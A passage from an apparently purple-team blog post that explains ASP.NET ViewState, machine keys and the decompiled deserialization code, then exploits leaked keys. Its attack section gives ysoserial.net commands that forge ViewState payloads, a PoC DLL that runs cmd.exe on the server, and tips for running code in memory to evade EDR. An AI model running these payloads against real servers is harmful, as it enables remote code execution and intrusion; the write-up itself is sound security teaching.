</span></span><span class=line><span class=cl>		<span class=kt>byte</span><span class=p>[]</span> <span class=n>array</span> <span class=p>=</span> <span class=n>memoryStream</span><span class=p>.</span><span class=n>GetBuffer</span><span class=p>();</span>
</span></span><span class=line><span class=cl>		<span class=kt>int</span> <span class=n>length</span> <span class=p>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>memoryStream</span><span class=p>.</span><span class=n>Length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>result</span> <span class=p>=</span> <span class=n>Convert</span><span class=p>.</span><span class=n>ToBase64String</span><span class=p>(</span><span class=n>array</span><span class=p>,</span> <span class=m>0</span><span class=p>,</span> <span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>finally</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>ObjectStateFormatter</span><span class=p>.</span><span class=n>ReleaseMemoryStream</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Seeing this in action:</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img9.png width=1311 height=393 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img9_hucb6350b8df726ec04a65e40f1c843a68_53583_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img9_hucb6350b8df726ec04a65e40f1c843a68_53583_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 9 - DnSpy Debug " class=gallery-image data-flex-grow=333 data-flex-basis=800px></p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img10.png width=618 height=194 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img10_hu1b78a0501eb83f3e79c355cea2ae6372_27813_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img10_hu1b78a0501eb83f3e79c355cea2ae6372_27813_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 10 - BurpSuite Response " class=gallery-image data-flex-grow=318 data-flex-basis=764px></p><p>This code align with the microsoft explanation of view state we saw earlier: &ldquo;the current state of the page and values that must be retained during postback are serialized into base64-encoded strings&rdquo;.</p><p>With this visual walkthrough, we now understand what view state is, its purpose and a bit of what happens under the hood.</p><h2 id=machine-keys>Machine Keys</h2><p>As we&rsquo;ve seen, when a view state is sent back to an ASP.NET app, the deserialization process occur.</p><p>When this architecture was originally designed, deserialization attacks were not a major security concern. This mean that if an attacker craft a malicious serialized object inside the view state, the application will instantiate it. This can be weaponized through gadget chains. The tool ysoserial.net makes this process trivial, but let&rsquo;s talk about it in the attack section.</p><p>In order to prevent these type of attacks, validation and encryption keys were created and are now enforced by default in ASP.NET.</p><p>In IIS Manager, the &ldquo;Machine Keys&rdquo; section holds this configuration:</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img11.png width=943 height=215 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img11_hu4c9eeef1ea3da22fc29f988a230bb41a_49396_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img11_hu4c9eeef1ea3da22fc29f988a230bb41a_49396_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 11 - Machine Keys " class=gallery-image data-flex-grow=438 data-flex-basis=1052px></p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img12.png width=1199 height=352 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img12_hue1282963c5bfd9e950d177e174f4b8da_27672_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img12_hue1282963c5bfd9e950d177e174f4b8da_27672_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 12 - Machine Keys Configuration " class=gallery-image data-flex-grow=340 data-flex-basis=817px></p><p>Let&rsquo;s define the purpose of these keys.</p><ul><li><p>Validation Key: Is used to create message authentication code (MAC). Basically this is the key used to sign the viewstate, granting that the view state has not been tampered with. The algorithms available are: AES, MD5, SHA1, TripleDES, HMACSHA256, HMACSHA384, HMACSHA512. There are others purposes for this key, <a class=link href="https://learn.microsoft.com/en-us/dotnet/api/system.web.configuration.machinekeysection.validationkey?view=netframework-4.8.1&amp;redirectedfrom=MSDN#System_Web_Configuration_MachineKeySection_ValidationKey" target=_blank rel=noopener>check it in here</a>.</p></li><li><p>Encryption Key: Used to encrypt the view state itself. If some sensitive information is stored on the view state, is possible to use this mechanism to encrypt it and mantain safe while client side. There are three values for encryption mode:</p><ul><li>Always: View state is always encrypted.</li><li>Never: The view state is never encrypted.</li><li>Auto: Encrypted only if one of the controls requests it.</li></ul></li></ul><p>If the option <strong>Automatically generate at runtime</strong> (figure 12) is enabled, IIS will generate a master machine key for the server lifetime. Then the keys are derived from this master, and the secret itself is not stored on the config file (it’s kept in the registry). This is ideal when running a single server.</p><p>In a web farm scenario (e.g., behind a load balancer), the keys preferably should be statically configured, because the servers must share the same keys. For more detailed information on this process, these are great resources: <a class=link href="https://learn.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/w8h3skw9%28v=vs.100%29" target=_blank rel=noopener>1</a> <a class=link href=https://zeroed.tech/blog/viewstate-the-unpatchable-iis-forever-day-being-actively-exploited/ target=_blank rel=noopener>2</a></p><p>In this example we&rsquo;ll be using static keys. To generate it, choose the algorithm and simply click on &ldquo;Generate Keys&rdquo; and &ldquo;Apply&rdquo;. This will add the &ldquo;machineKey&rdquo; section on web.config:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=c>&lt;!--
</span></span></span><span class=line><span class=cl><span class=c>  For more information on how to configure your ASP.NET application, please visit
</span></span></span><span class=line><span class=cl><span class=c>  https://go.microsoft.com/fwlink/?LinkId=169433
</span></span></span><span class=line><span class=cl><span class=c>  --&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;configuration&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;system.web&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;compilation</span> <span class=na>targetFramework=</span><span class=s>&#34;4.7.2&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;httpRuntime</span> <span class=na>targetFramework=</span><span class=s>&#34;4.7.2&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;pages&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;namespaces&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;add</span> <span class=na>namespace=</span><span class=s>&#34;System.Web.Optimization&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;/namespaces&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;controls&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;add</span> <span class=na>assembly=</span><span class=s>&#34;Microsoft.AspNet.Web.Optimization.WebForms&#34;</span> <span class=na>namespace=</span><span class=s>&#34;Microsoft.AspNet.Web.Optimization.WebForms&#34;</span> <span class=na>tagPrefix=</span><span class=s>&#34;webopt&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nt>&lt;/controls&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/pages&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;machineKey</span> <span class=na>decryption=</span><span class=s>&#34;AES&#34;</span> <span class=na>decryptionKey=</span><span class=s>&#34;42F72B586A8082CFA5D40BE1DEB0AA2C71380B87D0548927&#34;</span> <span class=na>validation=</span><span class=s>&#34;SHA1&#34;</span> <span class=na>validationKey=</span><span class=s>&#34;05A6FB2A837EA6BBD0394646CD63460B28A334D38E77721B8241FFCB69DF3BACC8D26CC97AA92F544833A47D785B28D4796BE03B0E8969E46A923FF8124A486C&#34;</span> <span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>  <span class=nt>&lt;/system.web&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>To summarize:</p><ul><li>ViewState can be <strong>authenticated and encrypted</strong> (using both validation and encryption keys), or just <strong>authenticated</strong> (using only the validation key).</li><li>While it is possible to disable this protection entirely, it is uncommon because Microsoft enforces it by default (<a class=link href=https://devblogs.microsoft.com/dotnet/farewell-enableviewstatemac/ target=_blank rel=noopener>see reference</a>).</li></ul><p>Back to the deserialization function, below is the complete code.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C# data-lang=C#><span class=line><span class=cl><span class=kd>private</span> <span class=kt>object</span> <span class=n>Deserialize</span><span class=p>(</span><span class=kt>string</span> <span class=n>inputString</span><span class=p>,</span> <span class=n>Purpose</span> <span class=n>purpose</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=kt>string</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>inputString</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>throw</span> <span class=k>new</span> <span class=n>ArgumentNullException</span><span class=p>(</span><span class=s>&#34;inputString&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=kt>byte</span><span class=p>[]</span> <span class=n>array</span> <span class=p>=</span> <span class=n>Convert</span><span class=p>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>inputString</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>num</span> <span class=p>=</span> <span class=n>array</span><span class=p>.</span><span class=n>Length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>try</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=n>AspNetCryptoServiceProvider</span><span class=p>.</span><span class=n>Instance</span><span class=p>.</span><span class=n>IsDefaultProvider</span> <span class=p>&amp;&amp;</span> <span class=p>!</span><span class=k>this</span><span class=p>.</span><span class=n>_forceLegacyCryptography</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=n>_page</span> <span class=p>!=</span> <span class=kc>null</span> <span class=p>&amp;&amp;</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=n>_page</span><span class=p>.</span><span class=n>ContainsEncryptedViewState</span> <span class=p>||</span> <span class=k>this</span><span class=p>.</span><span class=n>_page</span><span class=p>.</span><span class=n>EnableViewStateMac</span><span class=p>))</span>
</span></span><span class=line><span class=cl>			<span class=p>{</span>
</span></span><span class=line><span class=cl>				<span class=n>Purpose</span> <span class=n>purpose2</span> <span class=p>=</span> <span class=n>purpose</span><span class=p>.</span><span class=n>AppendSpecificPurposes</span><span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=n>GetSpecificPurposes</span><span class=p>());</span>
</span></span><span class=line><span class=cl>				<span class=n>ICryptoService</span> <span class=n>cryptoService</span> <span class=p>=</span> <span class=n>AspNetCryptoServiceProvider</span><span class=p>.</span><span class=n>Instance</span><span class=p>.</span><span class=n>GetCryptoService</span><span class=p>(</span><span class=n>purpose2</span><span class=p>,</span> <span class=n>CryptoServiceOptions</span><span class=p>.</span><span class=n>None</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=kt>byte</span><span class=p>[]</span> <span class=n>array2</span> <span class=p>=</span> <span class=n>cryptoService</span><span class=p>.</span><span class=n>Unprotect</span><span class=p>(</span><span class=n>array</span><span class=p>);</span>
</span></span><span class=line><span class=cl>				<span class=n>array</span> <span class=p>=</span> <span class=n>array2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=n>num</span> <span class=p>=</span> <span class=n>array2</span><span class=p>.</span><span class=n>Length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=n>_page</span> <span class=p>!=</span> <span class=kc>null</span> <span class=p>&amp;&amp;</span> <span class=k>this</span><span class=p>.</span><span class=n>_page</span><span class=p>.</span><span class=n>ContainsEncryptedViewState</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=n>array</span> <span class=p>=</span> <span class=n>MachineKeySection</span><span class=p>.</span><span class=n>EncryptOrDecryptData</span><span class=p>(</span><span class=kc>false</span><span class=p>,</span> <span class=n>array</span><span class=p>,</span> <span class=k>this</span><span class=p>.</span><span class=n>GetMacKeyModifier</span><span class=p>(),</span> <span class=m>0</span><span class=p>,</span> <span class=n>num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=n>num</span> <span class=p>=</span> <span class=n>array</span><span class=p>.</span><span class=n>Length</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>else</span> <span class=k>if</span> <span class=p>((</span><span class=k>this</span><span class=p>.</span><span class=n>_page</span> <span class=p>!=</span> <span class=kc>null</span> <span class=p>&amp;&amp;</span> <span class=k>this</span><span class=p>.</span><span class=n>_page</span><span class=p>.</span><span class=n>EnableViewStateMac</span><span class=p>)</span> <span class=p>||</span> <span class=k>this</span><span class=p>.</span><span class=n>_macKeyBytes</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=n>array</span> <span class=p>=</span> <span class=n>MachineKeySection</span><span class=p>.</span><span class=n>GetDecodedData</span><span class=p>(</span><span class=n>array</span><span class=p>,</span> <span class=k>this</span><span class=p>.</span><span class=n>GetMacKeyModifier</span><span class=p>(),</span> <span class=m>0</span><span class=p>,</span> <span class=n>num</span><span class=p>,</span> <span class=k>ref</span> <span class=n>num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>catch</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>PerfCounters</span><span class=p>.</span><span class=n>IncrementCounter</span><span class=p>(</span><span class=n>AppPerfCounter</span><span class=p>.</span><span class=n>VIEWSTATE_MAC_FAIL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>ViewStateException</span><span class=p>.</span><span class=n>ThrowMacValidationError</span><span class=p>(</span><span class=kc>null</span><span class=p>,</span> <span class=n>inputString</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=kt>object</span> <span class=n>result</span> <span class=p>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>MemoryStream</span> <span class=n>memoryStream</span> <span class=p>=</span> <span class=n>ObjectStateFormatter</span><span class=p>.</span><span class=n>GetMemoryStream</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=k>try</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>memoryStream</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=n>array</span><span class=p>,</span> <span class=m>0</span><span class=p>,</span> <span class=n>num</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=n>memoryStream</span><span class=p>.</span><span class=n>Position</span> <span class=p>=</span> <span class=m>0L</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=n>result</span> <span class=p>=</span> <span class=k>this</span><span class=p>.</span><span class=n>Deserialize</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>finally</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=n>ObjectStateFormatter</span><span class=p>.</span><span class=n>ReleaseMemoryStream</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>result</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The first conditional expression inside try (line 11) is where the .NET compability mode is verified. In .NET Framework 4.5 and later, the machine key system incorporates the concept of a <strong>purpose</strong>. This means keys are derived differently for each application, using factors such as:</p><ul><li>The application’s virtual path (<code>TemplateSourceDirectory</code>).</li><li>The page type.</li><li>The <code>ViewStateUserKey</code> (if present).</li></ul><p>This makes the key derivation unique per app and improves isolation. Below, the code of <code>GetSpecificPurposes</code> function:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C# data-lang=C#><span class=line><span class=cl><span class=kd>internal</span> <span class=n>List</span><span class=p>&lt;</span><span class=kt>string</span><span class=p>&gt;</span> <span class=n>GetSpecificPurposes</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=n>_specificPurposes</span> <span class=p>==</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=n>_page</span> <span class=p>==</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=n>List</span><span class=p>&lt;</span><span class=kt>string</span><span class=p>&gt;</span> <span class=n>list</span> <span class=p>=</span> <span class=k>new</span> <span class=n>List</span><span class=p>&lt;</span><span class=kt>string</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;TemplateSourceDirectory: &#34;</span> <span class=p>+</span> <span class=k>this</span><span class=p>.</span><span class=n>_page</span><span class=p>.</span><span class=n>TemplateSourceDirectory</span><span class=p>.</span><span class=n>ToUpperInvariant</span><span class=p>(),</span>
</span></span><span class=line><span class=cl>			<span class=s>&#34;Type: &#34;</span> <span class=p>+</span> <span class=k>this</span><span class=p>.</span><span class=n>_page</span><span class=p>.</span><span class=n>GetType</span><span class=p>().</span><span class=n>Name</span><span class=p>.</span><span class=n>ToUpperInvariant</span><span class=p>()</span>
</span></span><span class=line><span class=cl>		<span class=p>};</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=k>this</span><span class=p>.</span><span class=n>_page</span><span class=p>.</span><span class=n>ViewStateUserKey</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=n>list</span><span class=p>.</span><span class=n>Add</span><span class=p>(</span><span class=s>&#34;ViewStateUserKey: &#34;</span> <span class=p>+</span> <span class=k>this</span><span class=p>.</span><span class=n>_page</span><span class=p>.</span><span class=n>ViewStateUserKey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>this</span><span class=p>.</span><span class=n>_specificPurposes</span> <span class=p>=</span> <span class=n>list</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=k>this</span><span class=p>.</span><span class=n>_specificPurposes</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>If the conditional fails, it will handle the encryption in the &ldquo;legacy&rdquo; (prior to .NET Framework 4.5) way, where there is no purpose. Encryption (if present) and MAC validation will be processed respectively.</p><p>I hope I have clarified the role of machine keys in the context of view state exploitation.</p><p>Let&rsquo;s jump to the fun phase (👉ﾟヮﾟ)👉</p><h2 id=attacking-view-state>Attacking View State</h2><p>Returning to the purple team scenario, the <code>web.config</code> file has been leaked, exposing the machine keys. This is not an uncommon scenario. In <a class=link href=https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/ target=_blank rel=noopener>this post</a> of Microsoft Security Inteligence team, more then 3k of these keys were found publicly available.</p><p>The critical risk emerges from the inherent vulnerabilities in the .NET functions responsible for deserialization. Microsoft warns against this in their <a class=link href=https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide target=_blank rel=noopener>documentation</a>:</p><p><img src=/p/exploiting-asp.net-leaked-machine-keys/img/img13.png width=731 height=507 srcset="/p/exploiting-asp.net-leaked-machine-keys/img/img13_hu41fd0daf26aba6c3af8a1c41ff49a7ae_44757_480x0_resize_box_3.png 480w, /p/exploiting-asp.net-leaked-machine-keys/img/img13_hu41fd0daf26aba6c3af8a1c41ff49a7ae_44757_1024x0_resize_box_3.png 1024w" loading=lazy alt="figure 13 - Microsoft Security Guide " class=gallery-image data-flex-grow=144 data-flex-basis=346px></p><p>Once the attacker have the keys to encrypt and/or sign the view state, every object within this forged view state will be instantiated during the deserialization process on the server.</p><p>To exploit this design, Soroush Dalili (@irsdl) created a plugin called &ldquo;viewstate&rdquo; for <a class=link href=https://github.com/pwntester/ysoserial.net.git target=_blank rel=noopener>ysoserial.net</a>. This tool generates a gadget chain to exploit the instantiation of the object, making possible code execution. It&rsquo;s creators presented this subject at defcon and delve deep into this process: <a class=link href="https://www.youtube.com/watch?v=ZBfBYoK_Wr0" target=_blank rel=noopener>https://www.youtube.com/watch?v=ZBfBYoK_Wr0</a></p><h4 id=command-execution>Command Execution</h4><p>To first explore this scenario, let&rsquo;s run a simple command. The syntax of ysoserial we will be using is the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c &#34;&lt;COMMAND&gt;&#34; --path=&#34;/&#34; --apppath=&#34;/&#34; --validationalg=&#34;&lt;Validation_algorithm&gt;&#34; --validationkey=&#34;&lt;validation_key_value&gt;&#34; --decryptionalg=&#34;&lt;decryption_algorithm&gt;&#34; --decryptionkey=&#34;&lt;decryption_key_value&gt;&#34; --isdebug
</span></span></code></pre></td></tr></table></div></div><ul><li><code>-p</code> indicates the plugin.</li><li><code>-g</code> gadget chain being used.</li><li><code>-c</code> command to run.</li><li><code>--path</code> path of the page being attacked. In this case &ldquo;/&rdquo;, in other cases could be &ldquo;/account/login.aspx&rdquo;.</li><li><code>--apppath</code> the webroot of the application we are targeting.</li><li><code>--validationalg</code> algorithm of the valitation key.</li><li><code>--validationkey</code> actual value of the validation key.</li><li><code>--decryptionalg</code> algorithm of the decryption key.</li><li><code>--decryptionkey</code> actual value of the decryption key.</li></ul><p>Demo:</p><div class=video-wrapper><iframe loading=lazy src=https://www.youtube.com/embed/5caRXssA2go allowfullscreen title="YouTube Video"></iframe></div><p>Naturally you might be wondering about the scenarios where the keys are set to be auto-generated. In this case Soroush Dalili (@irsdl) comes to rescue again! By uploading this aspx code to the application, the automatically generated keys will be shown: <a class=link href=https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab target=_blank rel=noopener>https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab</a></p><h4 id=code-execution>Code Execution</h4><p>Command execution should suffice to exploit the application. But if some EDR is in place, probably this type of payload will be detected and prevented.</p><p>To circumvent this inconvenience, it is possible to execute code directly in memory and don&rsquo;t spawn a cmd.exe from w3wp.exe (highly suspicious).</p><p>First, let&rsquo;s create our dll (.NET Framework). This is the code that will run:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C# data-lang=C#><span class=line><span class=cl><span class=k>using</span> <span class=nn>System.Diagnostics</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nn>PoC</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>internal</span> <span class=k>class</span> <span class=nc>Program</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=n>Program</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>Process</span><span class=p>.</span><span class=n>Start</span><span class=p>(</span><span class=s>&#34;cmd.exe&#34;</span><span class=p>,</span> <span class=s>&#34;/c tasklist.exe &gt; C:\\Users\\Public\\Hacked.txt&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Of course this is just a PoC code and do not remain in memory. Weaponization is let to the reader (see the references section).</p><p>With this compiled dll we can use ysoserial again to build the payloads. Fist, is necessary to use the gadget ActivitySurrogateDisableTypeCheck to disable type protections for ActivitySurrogateSelector.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.\ysoserial.exe -p ViewState -g ActivitySurrogateDisableTypeCheck -c &#34;ignore&#34; --path=&#34;/&#34; --apppath=&#34;/&#34; --validationalg=&#34;&lt;Validation_algorithm&gt;&#34; --validationkey=&#34;&lt;validation_key_value&gt;&#34; --decryptionalg=&#34;&lt;decryption_algorithm&gt;&#34; --decryptionkey=&#34;&lt;decryption_key_value&gt;&#34; --isdebug
</span></span></code></pre></td></tr></table></div></div><p>Now we&rsquo;ll be using the ActivitySurrogateSelectorFromFile gadget to generate our payload based on our compiled dll.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
